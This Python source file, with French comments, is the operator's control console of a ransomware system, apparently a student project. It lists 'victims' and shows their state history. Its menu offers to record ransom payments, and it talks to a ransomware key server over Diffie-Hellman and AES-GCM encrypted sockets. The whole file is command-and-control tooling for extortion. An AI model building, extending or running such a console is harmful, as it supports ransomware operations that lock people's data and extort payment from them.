# coding: utf8
from utile.network import start_serv, receive_message, connect, send_message
from utile.security import send_Diffie_Hellman_exchange_key, AES_GCM_decrypt, AES_GCM_encrypt
import os
import ast
from time import sleep

IP = "127.0.0.1"    #IP utilisée pour créer le serveur de la console et se connecter au serveur clé
PORT = 8380         #Port du serveur créé par la console
PORT_R = 8382       #Port du serveur clé pour la connexion


def main():

    """
    Utilise le retour de la fonction menu pour completer la tâche demandée.
    Diffie_Hellman au début pour obtenir la clé commune avec le serveur de clé afin de crypté

    :return: NA
    """

    tuple_retour = connect(IP, PORT, True)                  # Récupère un tuple lors de la connexion au serveur
    socket = tuple_retour[0]                                # La position 0 est le socket de connexion et la position 1
    g_p = tuple_retour[1]                                   # Est le g_p requis pour Dif_Hellman
    common_secret = send_Diffie_Hellman_exchange_key(socket, IP, PORT, g_p)  #Appel de la fonction et récupère la clé commune
    #print(common_secret)

    choix = menu()                                          # Récupère le choix une 1ère fois de l'user récupéré au menu
    liste = False                                           # Booléen set à False pour ne pas acceder a l'historique
                                                            # Sans avoir fait le listing au préalable
    while True:                                             # Boucle "infinie" jusqu'à ce que le choix 4 soit récupéré

        if choix == '1':
            liste = listing(socket, common_secret)          # Entre dans la fonction listing et récupère le return

        elif choix == '2':
            historiques_victime(socket, liste, common_secret)              # Entre dans la fonction historique
        elif choix == '4':
            quitter(socket, common_secret)                  #Entre dans la fonction quit pour quitter le prog proprement
            exit(0)                                         # Exit 0 car fin connue

        os.system('cls')                                    # Clear Screen pour plus de propreté
        choix = menu()                                      # Récupère le choix de l'user et recommence la boucle


def menu():

    """
    Menu principal au démarrage du programme
    :return: Le choix de l'user
    """

    print(" ____ ___                ____ ___  ")
    print("|    |   \ __  ____  __ |    |   \ ")
    print("|    |   / \ \/ /\ \/ / |    |   / ")
    print("|_______/   \__/  \__/  |_______/  ")
    print("CONSOLE DE CONTRÔLE")
    print("___________________\n\n")
    print("1) Lister les victimes\n")
    print("2) Historiques des états d'une victime\n")
    print("3) Renseigner le payement de rançon d'une victime\n")
    print("4) Quitter\n")
    return input("Votre choix : ")


def listing(socket, common_key):

    """

    Envoie une demande au serveur clé pour récupéré la liste des victimes.
    :param socket: socket de la connexion du serveur
    :param common_key: clé diffie hellman
    :return: return un booléen pour la fonction historique
    """
    encrypted = AES_GCM_encrypt("1", common_key)
    send_message(socket, encrypted, IP, PORT)           # l'attribut 1 signifie une demande de listing pour le serveur clé

    socket = start_serv(IP, PORT_R)             # Crée un serveur pour récupérer les données envoyé par le serveur clé

    while socket:                               # Boucle jusqu'à la fin de la BD

        crypted_msg = receive_message(socket)
        dict_victim = AES_GCM_decrypt(crypted_msg, common_key)  # Récéption du dictionnaire envoyé par le serveur clé
        dict_victim = convert_byte2dict(dict_victim)
        if not dict_victim:                     # Si le serveur clé renvoie False quitte la boucle car plus de victime
            break
        else:
            print(dict_victim)

    os.system("pause")                          # System pause pour plus de propreté
    liste = True                                # Booléen mis à True pour pouvoir acceder à l'historique
    return liste


def historiques_victime(socket, liste, common_key):

    """
    Permet l'affichage de l'historique d'une victime précisée par l'user
    :param common_key: Clé diffie hellman
    :param socket: socket du serveur créé par la console
    :param liste: Booléen reçu de listing. Si false, ne fait rien.
    :return: NA
    """

    if not liste:                                       # Si le booléen est False print un message à l'user
        print("Veuillez d'abord lister les victimes")   # Système pause pour plus de propreté
        os.system("pause")                              # Et retour au menu

    else:
        encrypted = AES_GCM_encrypt("2", common_key)
        send_message(socket, encrypted, IP, PORT)               # Envoie 2 au serveur clé pour qu'il accède à la partie
                                                        # historique
        message = input("ID Victime : ")                # Récupère l'input de l'user et boucle tant que le résultat
        while not message.isdigit():                    # N'est pas un digit.
            message = input("ID Victime : ")
        message = AES_GCM_encrypt(message, common_key)
        send_message(socket, message, IP, PORT)         # Envois l'id récupéré au serveur clé

        crypted_msg = receive_message(socket)           # Récupère le/les dictionnaire.s lié à l'user demandé et affiche
        dict_victim = AES_GCM_decrypt(crypted_msg, common_key)
        dict_victim = convert_byte2dict(dict_victim)
        if not dict_victim:
            print("Aucune victime liée à cet ID")
        else:
            print(dict_victim)                              # l'historique lié à cet user

        os.system("pause")                              # System pause pour plus de propreté


def quitter(socket, common_key):
    encrypted = AES_GCM_encrypt("Quit", common_key)
    send_message(socket, encrypted, IP, PORT)              # Envois 'quit' au serveur clé et se déconnecte proprement


def convert_byte2dict(dict_victim):

    dict_victim = bytes.decode(dict_victim, 'utf-8')
    if dict_victim == "Fin":
        return False
    else:
        return ast.literal_eval(dict_victim)


if __name__ == '__main__':
    main()
